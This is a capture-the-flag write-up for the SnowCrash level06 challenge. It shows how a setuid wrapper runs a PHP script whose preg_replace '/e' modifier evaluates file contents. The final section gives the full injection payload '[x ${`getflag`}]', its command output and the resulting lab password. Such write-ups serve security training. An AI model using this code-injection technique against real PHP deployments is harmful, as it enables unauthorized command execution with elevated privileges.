# level06 - Irregular Expression

## Home Content

- `level06` home contains two files of some interest: `level06` and `level06.php`.
- Both belongs to `flag06` but they are in `level06` group.
- We have executions right on both files.
- The SETUID bit of `flag06` is set.

```console
level06@SnowCrash:~$ pwd
/home/user/level06
level06@SnowCrash:~$ ls -al
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile

level06@SnowCrash:~$ getfacl level06
# file: level06
# owner: flag06
# group: level06
# flags: s--
user::rwx
group::---
group:level06:r-x
mask::r-x
other::---
```

## `flag06` Executable

### String Content

- Based on strings found in the binary, we may suppose that `level06` will allow us to run `level06.php` as `flag06`.

```console
level06@SnowCrash:~$ strings -a level06
                    ...
strdup
setresgid
setresuid
execve
getegid
geteuid
                    ...
fr/usr/bin/php
/home/user/level06/level06.php
                    ...
```

## `flag06.php`

```php
#!/usr/bin/php

<?php

function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
return $m;
}

function x($y, $z){
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]); print $r;
?>
```

- The program receives two arguments as parameters. Only the first one will be used.
- This first argument must be a file name. The program will open it and retrieve the content.
- The content will then be parsed by different regular expressions.
- One of them is able to execute the parsed content (the /e option).
- Notice that this option is deprecated but the PHP version (5.3.10) on SnowCrash in old enough to allow it.

```console
level06@SnowCrash:~$ php -v
PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54)
Copyright (c) 1997-2012 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies
```

### Irregular Expressions

- The first regex (the executable one) will first parse a pattern like `[x SOMETHING ]` and replace it by `y("SOMETHING")`.
- As `y()` is a legit function, replacing `SOMETHING` by `${SOMETHING}` will allow it to be executed. Provided that `SOMETHING` don't contain any `.` or `@`, the function `y()` will return the string `SOMETHING`.
- That string will again be executed.
- Using `` `getflag` `` instead of `SOMETHING`, will do the trick.

## Misuse of PHP

```console
level06@SnowCrash:~$ chmod 777 .
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > irregex
level06@SnowCrash:~$ ./level06 irregex
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

# Flag

- `level07` password (flag): `wiok45aaoguiboiki2tuin6ub`

<p align="center"><a href="../level05/level05.md"><= Previous</a>&ensp;&ensp;&ensp;&ensp;<a href="../level07/level07.md">Next =></a></p>
